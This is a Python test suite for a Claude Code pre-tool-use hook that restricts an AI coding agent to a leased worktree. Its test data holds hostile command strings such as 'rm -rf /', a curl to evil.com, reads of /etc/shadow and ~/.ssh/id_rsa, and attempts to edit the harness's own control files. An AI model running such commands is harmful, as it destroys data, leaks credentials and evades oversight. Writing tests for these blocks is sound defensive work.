#!/usr/bin/env python3
"""test_claude_code_adapter.py — adapters/claude-code/pretooluse_hook.py のテスト (Phase 3A)

契約:
1. 既存の Claude Code PreToolUse hook 契約（Read, Edit, Bash, WebFetch等）の互換性維持
2. Lease Gate (Phase 3A) 連携:
   - Lease 管理ドメイン内の Edit/Write: 有効 Lease あり -> exit 0, Lease なし/無効 -> exit 2 + stderr
   - Lease 管理外の Edit/Write: 従来の Portable Core 判定へフォールバック
"""

import json
import os
import subprocess
import sys
import tempfile

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_ADAPTER_DIR = os.path.join(ROOT_DIR, "adapters", "claude-code")
_HOOK_PATH = os.path.join(_ADAPTER_DIR, "pretooluse_hook.py")
RUNTIME_DIR = os.path.join(ROOT_DIR, "runtime")
if RUNTIME_DIR not in sys.path:
    sys.path.insert(0, RUNTIME_DIR)
if _ADAPTER_DIR not in sys.path:
    sys.path.insert(0, _ADAPTER_DIR)

import local_execution_gate as leg
import pretooluse_hook as hook
from local_execution_lease import (
    CanonicalTaskReference,
    PolicyReference,
    RuntimeContext,
    derive_lease,
)
from local_execution_lease_state import LeaseRuntimeState, LeaseStateStore, ObservedExecutionState

PASS = 0
FAIL = 0


def check(name: str, condition: bool, detail: str = "") -> None:
    global PASS, FAIL
    if condition:
        PASS += 1
        print(f"  PASS  {name}")
    else:
        FAIL += 1
        print(f"  FAIL  {name}  {detail}")
        assert condition, f"{name}: {detail}"


def run_hook_subproc(payload: dict, env: dict | None = None) -> subprocess.CompletedProcess:
    hook_env = os.environ.copy()
    hook_env.setdefault("UME_HARNESS_STATE_DIR", "/tmp/ume_harness_test_isolated_state")
    if env:
        hook_env.update(env)
    return subprocess.run(
        [sys.executable, _HOOK_PATH],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        env=hook_env,
    )


# --- 1. 既存の基本フック挙動テスト ---
def test_read_tool_allowed() -> None:
    print("\n[ALLOW] Read tool -> exit 0")
    p = run_hook_subproc({"tool_name": "Read", "tool_input": {"file_path": "/tmp/x.txt"}})
    check("exit 0", p.returncode == 0, f"got {p.returncode}")


def test_edit_tool_allowed_tier_normal_unmanaged() -> None:
    print("\n[ALLOW] Edit tool (BOUNDED_WRITE, unmanaged domain) -> exit 0")
    p = run_hook_subproc({"tool_name": "Edit", "tool_input": {"file_path": "/tmp/x.txt"}})
    check("exit 0", p.returncode == 0, f"got {p.returncode}")


def test_destructive_bash_blocked() -> None:
    print("\n[BLOCK] rm -rf を含むBash -> exit 2")
    p = run_hook_subproc({"tool_name": "Bash", "tool_input": {"command": "rm -rf /tmp/foo"}})
    check("exit 2", p.returncode == 2, f"got {p.returncode}")
    check("理由がstderrに出る", "DESTRUCTIVE" in p.stderr, f"stderr={p.stderr!r}")


def test_git_push_blocked() -> None:
    print("\n[BLOCK] git push (EXTERNAL_MUTATION) -> exit 2")
    p = run_hook_subproc({"tool_name": "Bash", "tool_input": {"command": "git push origin main"}})
    check("exit 2", p.returncode == 2, f"got {p.returncode}")


def test_safe_readonly_bash_allowed() -> None:
    print("\n[ALLOW] 明示的に安全なread-onlyコマンド（ls）-> exit 0")
    p = run_hook_subproc({"tool_name": "Bash", "tool_input": {"command": "ls -la"}})
    check("exit 0", p.returncode == 0, f"got {p.returncode}")


def test_unrecognized_bash_fails_closed() -> None:
    print("\n[fail-closed] 未知のBashコマンド（allowlist外）-> exit 2（承認要求）")
    p = run_hook_subproc({"tool_name": "Bash", "tool_input": {"command": "some_custom_tool --flag"}})
    check("exit 2（安全側に倒れる）", p.returncode == 2, f"got {p.returncode}")


def test_unrecognized_tool_fails_closed() -> None:
    print("\n[fail-closed] 未知のtool_name -> exit 2")
    p = run_hook_subproc({"tool_name": "SomeFutureTool", "tool_input": {}})
    check("exit 2", p.returncode == 2, f"got {p.returncode}")


def test_webfetch_blocked_as_external_mutation() -> None:
    print("\n[BLOCK] WebFetch (EXTERNAL_MUTATION) -> exit 2")
    p = run_hook_subproc({"tool_name": "WebFetch", "tool_input": {"url": "https://example.com"}})
    check("exit 2", p.returncode == 2, f"got {p.returncode}")


def test_malformed_json_input_fails_closed() -> None:
    print("\n[fail-closed] 壊れたJSON入力 -> exit 2（無言で許可しない）")
    p = subprocess.run([sys.executable, _HOOK_PATH], input="not json{{{", capture_output=True, text=True)
    check("exit 2", p.returncode == 2, f"got {p.returncode}")


def test_empty_stdin_allowed() -> None:
    print("\n[edge case] 空stdin -> exit 0（Claude Codeの一部イベントでtool情報が無いケースを想定）")
    p = subprocess.run([sys.executable, _HOOK_PATH], input="", capture_output=True, text=True)
    check("exit 0", p.returncode == 0, f"got {p.returncode}")


# --- 2. Lease Gate 連携テスト (Phase 3A) ---
def test_lease_gate_managed_domain_with_active_lease_allowed() -> None:
    print("\n[Lease Gate] Lease 管理ドメイン内の Edit + 有効な active Lease -> exit 0")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(worktree, exist_ok=True)
        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference(
            task_id="t1",
            task_contract_sha256="1" * 64,
            allowed_capabilities=frozenset({"edit"}),
        )
        policy = PolicyReference(
            policy_id="p1",
            policy_sha256="2" * 64,
            allowed_capabilities=frozenset({"edit"}),
        )
        context = RuntimeContext(
            repository="repo1",
            worktree_realpath=os.path.realpath(worktree),
            branch="task/b1",
            starting_head="3" * 40,
            baseline_status_digest="4" * 64,
            baseline_tree_digest="5" * 64,
        )
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)

        domain = leg.ManagedExecutionDomain(
            repository="repo1",
            worktree_realpath=os.path.realpath(worktree),
            management_mode="lease",
            policy_id="p1",
            policy_sha256="2" * 64,
        )
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: domain,
            policy_evaluator=lambda _p, _path, _a: True,
        )

        code, err = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(worktree, "code.py")}},
            gate=gate,
            state_dir=td,
        )
        check("exit 0 (ALLOW)", code == 0, f"got code={code}")
        check("err is None", err is None, f"got err={err!r}")


def test_lease_gate_managed_domain_without_lease_fails_closed() -> None:
    print("\n[Lease Gate] Lease 管理ドメイン内の Edit + Lease なし -> exit 2 (DENY)")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(worktree, exist_ok=True)
        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        domain = leg.ManagedExecutionDomain(
            repository="repo1",
            worktree_realpath=os.path.realpath(worktree),
            management_mode="lease",
            policy_id="p1",
            policy_sha256="2" * 64,
        )
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: domain,
            policy_evaluator=lambda _p, _path, _a: True,
        )

        code, err = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": os.path.join(worktree, "code.py")}},
            gate=gate,
            state_dir=td,
        )
        check("exit 2 (DENY)", code == 2, f"got code={code}")
        check("err contains NO_ACTIVE_LEASE", err is not None and "NO_ACTIVE_LEASE" in err, f"got err={err!r}")


def test_lease_gate_active_lease_scope_escape_denied() -> None:
    print("\n[Lease Gate Scope Escape] Active Lease 存在時の作業ツリー外 Edit/Write -> exit 2 (SCOPE_ESCAPE)")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(worktree, exist_ok=True)
        outside_path = os.path.join(td, "outside", "secret.py")
        os.makedirs(os.path.dirname(outside_path), exist_ok=True)

        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference(
            task_id="t1",
            task_contract_sha256="1" * 64,
            allowed_capabilities=frozenset({"edit"}),
        )
        policy = PolicyReference(
            policy_id="p1",
            policy_sha256="2" * 64,
            allowed_capabilities=frozenset({"edit"}),
        )
        context = RuntimeContext(
            repository="repo1",
            worktree_realpath=os.path.realpath(worktree),
            branch="task/b1",
            starting_head="3" * 40,
            baseline_status_digest="4" * 64,
            baseline_tree_digest="5" * 64,
        )
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)

        domain = leg.ManagedExecutionDomain(
            repository="repo1",
            worktree_realpath=os.path.realpath(worktree),
            management_mode="lease",
            policy_id="p1",
            policy_sha256="2" * 64,
        )
        gate = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: domain,
            policy_evaluator=lambda _p, _path, _a: True,
        )

        # Case 1: domain resolved but path outside worktree -> WORKTREE_ESCAPE
        code, err = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": outside_path}},
            gate=gate,
            state_dir=td,
        )
        check("exit 2 (DENY for worktree escape)", code == 2, f"got code={code}")
        check("err contains WORKTREE_ESCAPE", err is not None and "WORKTREE_ESCAPE" in err, f"got err={err!r}")

        # Case 2: unmanaged path (domain_resolver returns None) with active lease -> SCOPE_ESCAPE
        gate_unmanaged = leg.LocalExecutionGate(
            state_store=store,
            domain_resolver=lambda _: None,
            policy_evaluator=lambda _p, _path, _a: True,
        )
        code2, err2 = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": "/Users/someone/.ssh/id_rsa"}},
            gate=gate_unmanaged,
            state_dir=td,
        )
        check("exit 2 (DENY for scope escape on unmanaged path)", code2 == 2, f"got code={code2}")
        check("err contains SCOPE_ESCAPE", err2 is not None and "SCOPE_ESCAPE" in err2, f"got err={err2!r}")


def test_bash_shell_chaining_and_redirection_blocked() -> None:
    print("\n[Bash Safety] Shell chaining, subshells, redirections -> exit 2 (UNKNOWN/APPROVAL_REQUIRED)")
    attacks = [
        "echo ok; touch /tmp/outside_leak.txt",
        "cat foo; python3 -c \"open('/tmp/leak.txt','w').write('pwn')\"",
        "git status && curl https://evil.com/leak",
        "echo `rm -rf /`",
        "echo $(whoami)",
        "git log \n touch /tmp/chained.txt",
        "ls > /tmp/out.txt",
        "cat < /etc/shadow",
        "find . -exec rm {} +",
        "find / -delete",
        "git log --output=/tmp/leak.txt",
        "python3 -c 'print(1)'",
        "touch newfile.py",
    ]
    for cmd in attacks:
        p = run_hook_subproc({"tool_name": "Bash", "tool_input": {"command": cmd}})
        check(f"exit 2 for {cmd[:30]}", p.returncode == 2, f"got {p.returncode} for {cmd}")


def test_control_plane_modification_denied() -> None:
    print("\n[Control Plane Protection] <worktree>/.ume-harness/** への Edit/Write -> exit 2 (PROTECTED_ZONE_VIOLATION)")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(os.path.join(worktree, ".ume-harness"), exist_ok=True)
        domain_file = os.path.join(worktree, ".ume-harness", "domain.json")
        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference("t1", "1" * 64, frozenset({"edit", "test"}), test_profile="pytest")
        policy = PolicyReference("p1", "2" * 64, frozenset({"edit", "test"}), approved_test_profiles=frozenset({"pytest"}))
        context = RuntimeContext("repo1", os.path.realpath(worktree), "task/b1", "3" * 40, "4" * 64, "5" * 64)
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)

        domain = leg.ManagedExecutionDomain("repo1", os.path.realpath(worktree), "lease", "p1", "2" * 64)
        gate = leg.LocalExecutionGate(state_store=store, domain_resolver=lambda _: domain, policy_evaluator=lambda _p, _path, _a: True)

        # Attempt to Edit domain.json
        code, err = hook.evaluate_invocation(
            {"tool_name": "Edit", "tool_input": {"file_path": domain_file}},
            gate=gate,
            state_dir=td,
        )
        check("exit 2 (DENY on control plane)", code == 2, f"got {code}")
        check("err contains PROTECTED_ZONE_VIOLATION", err is not None and "PROTECTED_ZONE_VIOLATION" in err, f"got err={err!r}")


def test_active_lease_read_scope_escape_denied() -> None:
    print("\n[Read Scope Escape] Active Lease 下の作業ツリー外 Read / cat / head / grep -> exit 2 (SCOPE_ESCAPE)")
    with tempfile.TemporaryDirectory() as td:
        worktree = os.path.join(td, "worktree")
        os.makedirs(os.path.join(worktree, "src"), exist_ok=True)
        with open(os.path.join(worktree, "src", "code.py"), "w") as f:
            f.write("print('hello')")

        state_file = os.path.join(td, "leases.json")
        store = LeaseStateStore(
            state_path=state_file,
            observer=lambda state: ObservedExecutionState(
                starting_head=state.starting_head,
                status_digest=state.baseline_anchor.status_digest,
                tree_digest=state.baseline_anchor.tree_digest,
            ),
        )
        task = CanonicalTaskReference("t1", "1" * 64, frozenset({"edit", "test"}), test_profile="pytest")
        policy = PolicyReference("p1", "2" * 64, frozenset({"edit", "test"}), approved_test_profiles=frozenset({"pytest"}))
        context = RuntimeContext("repo1", os.path.realpath(worktree), "task/b1", "3" * 40, "4" * 64, "5" * 64)
        lease = derive_lease(task, policy, context)
        store.issue(lease)
        store.activate(lease.lease_id)

        domain = leg.ManagedExecutionDomain("repo1", os.path.realpath(worktree), "lease", "p1", "2" * 64)
        gate = leg.LocalExecutionGate(state_store=store, domain_resolver=lambda _: domain, policy_evaluator=lambda _p, _path, _a: True)

        # 1. Read inside worktree -> ALLOW
        c1, _ = hook.evaluate_invocation({"tool_name": "Read", "tool_input": {"file_path": os.path.join(worktree, "src", "code.py")}}, gate=gate, state_dir=td)
        check("Read inside worktree -> exit 0", c1 == 0, f"got {c1}")

        # 2. Read outside worktree -> DENY
        c2, e2 = hook.evaluate_invocation({"tool_name": "Read", "tool_input": {"file_path": "/Users/someone/.ssh/id_rsa"}}, gate=gate, state_dir=td)
        check("Read outside worktree -> exit 2", c2 == 2, f"got {c2}")
        check("err contains SCOPE_ESCAPE", e2 is not None and "SCOPE_ESCAPE" in e2, f"got err={e2!r}")

        # 3. Bash cat outside worktree -> DENY
        c3, e3 = hook.evaluate_invocation({"tool_name": "Bash", "tool_input": {"command": "cat /Users/someone/.ssh/id_rsa"}}, gate=gate, state_dir=td)
        check("Bash cat outside worktree -> exit 2", c3 == 2, f"got {c3}")
        check("err contains SCOPE_ESCAPE", e3 is not None and "SCOPE_ESCAPE" in e3, f"got err={e3!r}")

        # 4. Bash head outside worktree -> DENY
        c4, e4 = hook.evaluate_invocation({"tool_name": "Bash", "tool_input": {"command": "head -n 5 /etc/passwd"}}, gate=gate, state_dir=td)
        check("Bash head outside worktree -> exit 2", c4 == 2, f"got {c4}")
        check("err contains SCOPE_ESCAPE", e4 is not None and "SCOPE_ESCAPE" in e4, f"got err={e4!r}")

        # 5. Bash cat inside worktree -> ALLOW
        c5, _ = hook.evaluate_invocation({"tool_name": "Bash", "tool_input": {"command": "cat src/code.py"}}, gate=gate, state_dir=td)
        check("Bash cat inside worktree -> exit 0", c5 == 0, f"got {c5}")


def test_unmanaged_read_scope_allowed() -> None:
    print("\n[Unmanaged Read Scope] Lease なし環境での Read / cat -> exit 0 (通常利用維持)")
    with tempfile.TemporaryDirectory() as td:
        gate_nolease = leg.create_default_gate(domain_resolver=lambda _: None)
        c1, _ = hook.evaluate_invocation({"tool_name": "Read", "tool_input": {"file_path": "/tmp/test.txt"}}, gate=gate_nolease, state_dir=td)
        check("Unmanaged Read -> exit 0", c1 == 0, f"got {c1}")
        c2, _ = hook.evaluate_invocation({"tool_name": "Bash", "tool_input": {"command": "cat /tmp/test.txt"}}, gate=gate_nolease, state_dir=td)
        check("Unmanaged cat -> exit 0", c2 == 0, f"got {c2}")


def main() -> None:
    test_read_tool_allowed()
    test_edit_tool_allowed_tier_normal_unmanaged()
    test_destructive_bash_blocked()
    test_git_push_blocked()
    test_safe_readonly_bash_allowed()
    test_unrecognized_bash_fails_closed()
    test_unrecognized_tool_fails_closed()
    test_webfetch_blocked_as_external_mutation()
    test_malformed_json_input_fails_closed()
    test_empty_stdin_allowed()
    test_lease_gate_managed_domain_with_active_lease_allowed()
    test_lease_gate_managed_domain_without_lease_fails_closed()
    test_lease_gate_active_lease_scope_escape_denied()
    test_bash_shell_chaining_and_redirection_blocked()
    test_control_plane_modification_denied()
    test_active_lease_read_scope_escape_denied()
    test_unmanaged_read_scope_allowed()

    print(f"\n=== {PASS} passed, {FAIL} failed ===")
    sys.exit(1 if FAIL else 0)


if __name__ == "__main__":
    main()
